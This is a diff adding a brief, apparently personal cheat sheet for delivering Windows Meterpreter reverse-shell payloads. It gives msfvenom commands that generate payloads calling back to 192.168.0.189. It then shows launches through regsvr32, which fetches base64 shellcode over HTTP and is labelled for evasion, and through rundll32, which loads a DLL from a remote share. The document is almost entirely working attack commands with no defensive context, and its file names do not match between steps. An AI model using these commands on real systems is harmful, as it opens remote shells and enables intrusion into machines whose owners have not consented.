@@ -1,0 +1,21 @@
+Regsvr32 method
+
+Generate payload:
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.0.189 lport=443 --platform win -a x64  -f raw 2>/dev/null | base64  > rev.b64
+
+
+launch payload from host:
+
+regsrv32 /s /i:shellcode,http://192.168.0.189/code.b64 evade.dll
+
+
+
+Rundll method:
+Payload:
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.0.189 lport=4444 -ax64  -f dll > new.dll 
+
+
+Launch dll:
+
+rundll32 \\192.168.0.189\new.dll,test
+You must use ,test or the dll will not launch
